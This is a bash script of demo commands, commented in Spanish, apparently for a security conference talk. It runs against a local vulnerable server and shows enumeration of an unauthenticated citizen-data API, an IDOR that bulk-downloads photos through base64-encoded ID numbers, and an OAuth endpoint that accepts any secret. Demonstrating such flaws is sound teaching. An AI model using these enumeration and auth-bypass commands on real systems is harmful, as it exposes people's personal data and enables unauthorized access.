#!/bin/bash
# KipuCon Demo — Comandos para copiar/pegar durante la presentacion
# Servidor: http://localhost:3333 (cambiar si usas otro puerto)
HOST="http://localhost:3333"

# ============================================================
# ACTO 1 — API sin autenticacion
# ============================================================

# Consulta simple
curl -s "$HOST/api/v1/ciudadano/44556677" | jq .

# Enumeracion — 20 ciudadanos en segundos
for i in $(seq 44556670 44556690); do
  curl -s "$HOST/api/v1/ciudadano/$i" | jq '{dni: .resultado.dni, nombre: .resultado.nombre_completo, direccion: .resultado.direccion}'
done

# ============================================================
# ACTO 2 — IDOR con fotos via Base64
# ============================================================

# Codificar DNI a Base64
echo -n "44556677" | base64
# → NDQ1NTY2Nzc=

# Decodificar Base64 a DNI
echo "NDQ1NTY2Nzc=" | base64 -d
# → 44556677

# Consultar foto
curl -s "$HOST/api/foto/NDQ1NTY2Nzc=" --output foto_demo.svg && open foto_demo.svg

# Descargar 10 fotos consecutivas
for i in $(seq 44556670 44556680); do
  encoded=$(echo -n "$i" | base64)
  curl -s "$HOST/api/foto/$encoded" --output "foto_$i.svg"
  echo "Descargada foto de DNI $i"
done

# ============================================================
# ACTO 3 — Broken auth "lalalala"
# ============================================================

# lalalala como secret → token valido
curl -s -X POST "$HOST/api/oauth/token" \
  -H "Content-Type: application/json" \
  -d '{"client_id": "8872", "secret": "lalalala"}' | jq .

# Usar el token para ver transacciones
TOKEN=$(curl -s -X POST "$HOST/api/oauth/token" \
  -H "Content-Type: application/json" \
  -d '{"client_id": "8872", "secret": "lalalala"}' | jq -r '.access_token')

curl -s -H "Authorization: Bearer $TOKEN" \
  "$HOST/api/collections?status=approved" | jq .

# Probar otros secrets — TODOS funcionan
for secret in "abc123" "x" "password123" "hola"; do
  echo "--- secret: '$secret' ---"
  curl -s -X POST "$HOST/api/oauth/token" \
    -H "Content-Type: application/json" \
    -d "{\"client_id\": \"8872\", \"secret\": \"$secret\"}" | jq .access_token
done
